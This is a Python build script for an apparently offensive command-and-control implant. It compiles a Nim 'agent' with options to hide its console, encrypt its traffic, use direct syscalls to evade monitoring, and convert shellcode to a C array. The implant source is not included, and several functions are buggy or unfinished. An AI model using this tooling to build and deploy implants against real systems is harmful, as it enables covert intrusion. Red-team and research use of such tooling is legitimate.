import os
import time
import argparse
from rich import console
from subprocess import Popen, PIPE
from rich.progress import Progress

DEBUG = False
console = console.Console()

outputTypesPrint = {
        "exe":"Executable (.exe)",
        "dll":"Library (.dll)"
}

profiles = {
        "http": "PROFILE_HTTP",
        "smb": "PROFILE_SMB",
}


params = {
    "base_compiler_options": "--gc:arc -d=mingw --app=console -d:DEVENV --hint:name:off",
    "compiler_args_dll": "-d:strip -d=mingw --app=lib --nomain --cpu=amd64",
    "release_options": "-d:release --passc=-flto --passl=-flto -d:danger -d:strip --opt:size --stdout:off --hotCodeReloading:off -f --tlsEmulation:off --threads:off --nanChecks:off",
}


entry = "main.nim"

# global configuration variables
gvars = {
        "mode": "debug",            # compiliation mode: "debug" or "release"
        "profile": "http",          # connection profile [http, smb]
        "otype": "exe",             # output type: "exe" or "dll"
        "encryption": False,         # true or false
        "useDirectSyscalls": False, # usage of dynamic syscalls
        "outputFileName": "",       # name of the outfile
        "otypePrint":"Executable (.exe)",
        "hideConsole": False

        }

def printDbg(inp):
    if DEBUG:
        console.print(inp)

'''
Convert a binary file (shellcode)
to a c-style-array
'''
def to_c_array(binPath):

    f = open(sys.argv[1], 'rb')
    bytes = f.read()
    num = len(bytes)

    array = 'char shellcode[%d] = \n\t"' % (num)
    for b in range(len(bytes)):
      if b > num: break
      if b % 16 == 0 and b > 0:
        array += '"\n\t"'
      array += '\\x%02x' % bytes[b]

    array += '";\n'

    return array


def print_banner():
    console.print("")
    console.print("█▄▀ █▀█ █▀█ █▄░█ █▀█ █▀")
    console.print("█░█ █▀▄ █▄█ █░▀█ █▄█ ▄█")
    console.print("  [red]  \[build script][/red]")
    console.print("")


'''
Remove all the compilation artifacts:
    *.exe
    *.dll
    *.shellcode
'''
def cleanStuff():

    extensions = [".dll", ".exe", ".shellcode"]


    # check if its should be deleted
    inp = console.input("[blue]Want to clean the project? [Y/n][/blue] ")
    if inp.lower() != "y":
        return

    #files = [f in os.listdir() if f.endswith(
    remove_files = []
    for file in os.listdir():
        for ext in extensions:
            if file.endswith(ext):
                remove_files.append(file)
                os.remove(file)

    console.print(f"[!] Removed all {str(extensions)} files")


def printVars():

    console.print(f"[ Build Parameter: ]")
    console.print(f" |_ Type:         [magenta]{gvars['otype']}")
    console.print(f" |_ Profile:      {gvars['profile']}")
    console.print(f" |_ Encryption:   {gvars['encryption']}")
    console.print(f" |_ Use Syscalls: {gvars['useDirectSyscalls']}")
    console.print(f" |_ Hide Console: {gvars['hideConsole']}")
    console.print(f" \\_ Version:      {gvars['mode']}")
    console.print("")



'''
uses Popen to run the compilation command
'''
def run(comp):

    printDbg("[+] Compiling with the following command")
    printDbg(f"\t`{comp}`")

    command = [a for a in comp.split(" ") if a !="" ]

    process = Popen(command, stdout=PIPE, stderr=PIPE)

    poll_state = None


    with console.status("[magenta]Compiling binary...") as status:
        while poll_state == None:
            poll_state = process.poll()
            if poll_state == None:
                time.sleep(.2)

    stdout, stderr = process.communicate()

    printDbg("----- [ Compile Output] -----")
    printDbg(stdout)
    printDbg(stderr)
    printDbg("-----------------------------")


    if poll_state != 0:
        console.print(f"\n[red][-] An error has occured")
    else:
        console.print(f"\n[magenta][+] Binary has been compiled: `{gvars['outputFileName']}`")


def parseArgsToVars(args):

    if args.debug:
        gvars["mode"] = "debug"
    else:
        gvars["mode"] = "release"

    gvars["profile"] = args.profile
    gvars["otype"] = args.otype
    gvars["otypePrint"] = outputTypesPrint[args.otype]
    gvars["encrypt"] = args.encrypt
    gvars["useDirectSyscalls"] = args.useSyscalls
    gvars["outputFileName"] = args.outfile
    gvars["hideConsole"] = args.hideConsole

def build_agent():

    # debub build or release build?
    dbg = "-d:debug" if gvars["mode"] == "debug" else params['release_options']

    # base command
    com_cmd = f"nim c {params['base_compiler_options']} {dbg}"

    # add the profile
    com_cmd += f" -d:{profiles[gvars['profile']]} "

    # Hide Console Window?
    if gvars['hideConsole']:
        com_cmd += " -d:HIDE_CONSOLE "

    # Use traffic Encryption?
    if gvars['encrypt']:
        com_cmd += " -d:ENCRYPT_TRAFFIC "

    if gvars["otype"] == "exe":
        com_cmd += f" -o:{gvars['outputFileName']}"

        # entry point (nim file)
        com_cmd += f" {entry}"
        run(com_cmd)

    elif gvars["otype"] == "dll":
        com_cmd += f" -o:temp.exe"

        # entry point (nim file)
        com_cmd += f" {entry}"
        run(com_cmd)



def main():
    global DEBUG
    print_banner()


    # Argument Parsing
    parser = argparse.ArgumentParser()

    optional = parser.add_argument_group('Compilation Options')

    optional.add_argument('-ds', '--directsyscalls', action='store_false', default=False, dest='useSyscalls', help='Do NOT use direct syscalls by manually mapping NTDLL')

    optional.add_argument('-t', '--type', action='store', dest='otype', default="exe", help='Type of the output (Can be exe or dll)')
    optional.add_argument('-p', '--profile', action='store', dest='profile', default="http", help='Connection Profile [http, smb]')
    optional.add_argument('-o', '--outfile', action='store', dest='outfile', default="bin/agent.exe", help='Filename of the output file')
    optional.add_argument('-d', '--debug', action='store_true', default=False, dest='debug', help='Compile with runtime debug output of the binary')
    optional.add_argument('-e', '--encrypt', action='store_true', default=False, dest='encrypt', help='Use traffic encyption using AES')
    optional.add_argument('-hc', '--hide', action='store_true', dest='hideConsole', default=False, help='Hide the Console Window', required=False)
    optional.add_argument('-c', '--clean', action='store_true', dest='clean', default=False, help='Clean compilation residiue', required=False)

    optional.add_argument('-v', '--verbose', action='store_true', default=False, dest='verbose', help='Show Verbose output')


    args = parser.parse_args()
    parser.parse_args()

    if args.verbose:
        console.print("[!] Verbose Mode enabled")
        console.print("")
        DEBUG = True


    if args.clean:
        cleanStuff()
        exit(1)

    if args.profile not in ["http", "smb"]:
        console.print("[red][-][/red] Invalid connection profile")
        exit(1)


    parseArgsToVars(args)
    printVars()
    build_agent()



if __name__ == "__main__":
    main()

